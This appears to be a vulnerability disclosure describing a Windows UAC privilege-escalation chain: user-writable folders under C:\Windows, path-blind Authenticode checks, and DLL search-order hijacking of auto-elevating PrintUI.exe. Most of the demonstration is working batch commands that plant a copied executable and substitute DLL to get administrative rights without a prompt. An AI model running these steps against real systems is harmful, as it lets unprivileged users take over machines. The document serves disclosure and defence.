# Microsoft-Windows-UAC-Privilege-Escalation
Microsoft Windows can dupe users into trusting executables with DLL hijacking and privilege escalation issues

Hi @ll,

Microsoft still ships Windows with and lets it create user-writable
directories below the "Windows" directory %SystemRoot%\ -- despite
that, with exception of %SystemRoot%\Temp\, they are all used to
store DATA and SHOULD have been placed below %ProgramData% alias
%SystemDrive%\ProgramData\ instead!

JFTR: %ProgramData% was introduced with Windows Vista more than 15
      (in words: FIFTEEN) years ago, but Microsoft obviously just
      doesn't care to cleanup their mess.

Authenticode signature verification, for example required to color the
UAC prompt yellow (untrusted) or blue (trusted) and as precondition
for the "auto-elevation" (mis)feature of some 63+ applications shipped
with Windows 7 and ALL later versions, doesn't care about the filename
of an executable, but (eventually) evaluates the pathname of the
(application) directory.


Put together these two weaknesses allow to run arbitrary code WITH
administrative rights in several (user-writable) directories below
C:\Windows: in the account created during Windows setup without UAC
prompt, in (unprivileged) standard user accounts with (blue) UAC prompt!

### CVSS 3.0 score: 8.2 (High)
### CVSS 3.0 vector: 3.0/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H


# Demonstration
# ~~~~~~~~~~~~~

1. Log on to an arbitrary unprivileged (standard) user account and start
   the command processor, then run the following command lines to detect
   the user-writable directories below %SystemRoot%\ through creation of
   a hardlink named WRITABLE.EXE and collect their pathnames in the file
   %ProgramData%\WRITABLE.LOG:
   
```
   COPY /Y NUL: "%ProgramData%\WRITABLE.LOG" && (
   DIR "%SystemRoot%" /A:D /B /S 1>"%ProgramData%\WRITABLE.TMP" && (
   FOR /F "Delims= UseBackQ" %? IN ("%ProgramData%\WRITABLE.TMP") DO @(
   MKLINK /H "%~?\WRITABLE.EXE" "%ProgramData%\WRITABLE.LOG" 2>NUL: && 1>>"%ProgramData%\WRITABLE.LOG" ECHO %~?))
   TYPE "%ProgramData%\WRITABLE.LOG")
```   

   On fresh installations of Windows 10 2004/20H1/20H2 for AMD64 alias
   x64 processors this yields the following pathnames:

```
   C:\Windows\Tasks
   C:\Windows\Temp
   C:\Windows\tracing
   C:\Windows\Registration\CRMLog
   C:\Windows\System32\FxsTmp
   C:\Windows\System32\Tasks
   C:\Windows\System32\Com\dmp
   C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
   C:\Windows\System32\spool\PRINTERS
   C:\Windows\System32\spool\SERVERS
   C:\Windows\System32\spool\drivers\color
   C:\Windows\SysWOW64\FxsTmp
   C:\Windows\SysWOW64\Tasks
   C:\Windows\SysWOW64\Com\dmp
```   

   On installations which were upgraded to (any version of) Windows 10,
   the following additional pathname is typically listed:
   
```
   C:\Windows\System32\Tasks_Migrated
```   

   On installations which have been used for some time, the following
   additional pathnames are typically listed:
   
```
   C:\Windows\debug\WIA
   C:\Windows\PLA\Reports
   C:\Windows\PLA\Rules
   C:\Windows\PLA\Templates
   C:\Windows\PLA\Reports\de-DE
   C:\Windows\PLA\Reports\en-GB
   C:\Windows\PLA\Reports\en-US
   ...
   C:\Windows\PLA\Reports\ru-RU
   C:\Windows\PLA\Rules\de-DE
   C:\Windows\PLA\Rules\en-GB
   C:\Windows\PLA\Rules\en-US
   ...
   C:\Windows\PLA\Rules\ru-RU
   C:\Windows\System32\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}
   C:\Windows\System32\LogFiles\WMI
```

2. Let's see whether the hardlinks WRITABLE.EXE can be (ab)used: copy an
   arbitrary executable to all of them and execute it.

   JFTR: PrintUI.exe is one of the 63+ applications which have UAC auto-
         elevation enabled.
       
```
   SETLOCAL ENABLEDELAYEDEXPANSION
   COPY /Y "%ProgramData%\WRITABLE.LOG" "%ProgramData%\WRITABLE.TMP" && (
   COPY /Y "%SystemRoot%\System32\PrintUI.exe" "%ProgramData%\WRITABLE.LOG" && (
   FOR /F "Delims= UseBackQ" %? IN ("%ProgramData%\WRITABLE.TMP") DO (
   START "" /WAIT "%~?\WRITABLE.EXE"
   ECHO !ERRORLEVEL!)))
```   

   In unprivileged (standard) user accounts this triggers an UAC prompt
   for each file executed, some yellow, showing "Publisher: Unknown",
   some blue showing "Verified Publisher: Microsoft Windows".

   After giving consent to the UAC prompt a dialog box showing usage
   instructions for PrintUI.dll is displayed, indicating that (the copy
   of) PrintUI.exe loads PrintUI.dll:
   
```
   | Usage: rundll32 printui.dll,PrintUIEntry [options] [@commandfile]
```   

   JFTR: since PrintUI.exe runs elevated, PrintUI.dll runs elevated too!


3. Let's verify the Authenticode signature of the copy of PrintUI.exe:

```
   SignTool.exe VERIFY /A /V "%ProgramData%\WRITABLE.LOG"

   | Verifying: C:\ProgramData\WRITABLE.LOG
   | File is signed in catalog: C:\Windows\system32\CatRoot\{F750E6C3-38EE-11D1-85E5-
00C04FC295EE}\ntexe.cat
   ...
   | Successfully verified: C:\ProgramData\WRITABLE.LOG
   ...
```

   Authenticode doesn't care about the path/filename of signed executables,
   even for files with detached signatures, although the *.CAT files used
   to distribute detached digital signatures can store the filename!


4. Let's see whether PrintUI.exe follows the guidance given by the MSRC
   (Microsoft Security Response Center) in the almost 7 year old blog post
   <https://blogs.technet.microsoft.com/srd/2014/05/13/load-library-safely/>.
   the more than 10 year old security advisory
   <https://technet.microsoft.com/en-us/library/2269637.aspx>, or the nearly
   10 year old MSKB articles <https://support.microsoft.com/en-us/kb/2389418>
   and <https://support.microsoft.com/en-us/kb/2533623>: copy ShUnimpl.dll
   as PrintUI.dll next to the copy of PrintUI.exe and execute the latter.

   JFTR: ShUnimpl.dll is the graveyard for obsolete "shell" functions; its
         _DllMainCRTStartup() entry point function returns FALSE to disable
         their use, lets the module loader fail with NTSTATUS 0xC0000142
         alias STATUS_DLL_INIT_FAILED, and lets LoadLibrary() fail with the
         Win32 error 1114 alias ERROR_DLL_INIT_FAILED

```
   COPY "%SystemRoot%\System32\ShUnimpl.dll" "%ProgramData%\PrintUI.dll"
   RENAME "%ProgramData%\WRITABLE.LOG" PrintUI.exe
   START "" /WAIT "%ProgramData%\PrintUI.exe"
   CERTUTIL.exe /ERROR %ERRORLEVEL%
```

   OUCH: (the copy of) PrintUI.exe loads an arbitrary PrintUI.dll from its
         application directory instead of %SystemRoot%\System32\PrintUI.dll

   The Common Weaknesses and Exposures classifies such misbehavior, which
   results in arbitrary code execution (here with escalation of privilege),
   as
   - CWE-426: Untrusted Search Path
     <https://cwe.mitre.org/data/definitions/426.html>
   - CWE-427: Uncontrolled Search Path Element
     <https://cwe.mitre.org/data/definitions/427.html>

   The Common Attack Pattern Enumeration and Classification lists it as
   - CAPEC-471: Search Order Hijacking
     <https://capec.mitre.org/data/definitions/471.html>

   JFTR: (un)fortunately PrintUI.dll is not the only DLL that PrintUI.exe
         loads from an unsafe path, and (un)fortunately PrintUI.exe is not
         the only auto-elevating application which loads DLLs from unsafe
         paths!

   A really big "Hooray!" to Microsoft's sloppy, careless and clueless
   developers as well as their sound asleep quality^Wmiserability assurance!


5. Let's see whether UAC auto-elevation is also possible in at least one
   of the user-writable directories: log on to the UAC-controlled user
   account created during Windows setup, start an UNELEVATED (unprivileged)
   command prompt and run the following command lines:

```
   SETLOCAL ENABLEDELAYEDEXPANSION
   FOR /F "Delims= UseBackQ" %? IN ("%ProgramData%\WRITABLE.TMP") DO (
   MKLINK /H "%~?\PrintUI.dll" "%ProgramData%\PrintUI.dll" && (
   START "" /WAIT "%~?\WRITABLE.EXE"
   ECHO !ERRORLEVEL!))

```

   BINGO: GAME OVER!

   UAC performs auto-elevation at least in the directories
   C:\Windows\System32\CatRoot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\
   and C:\Windows\System32\Tasks_Migrated\; a copy of PrintUI.exe run in
   these directories loads/executes an arbitrary PrintUI.dll placed there
   too, with ADMINISTRATIVE privileges, without UAC prompt.

   JFTR: even without UAC auto-elevation, this beginner's error present in
         PrintUI.exe (really: almost all applications shipped with Windows)
         allows to fool Jane and Joe Average who typically give consent to a
         blue UAC prompt which shows "Certified Publisher: Microsoft Windows".

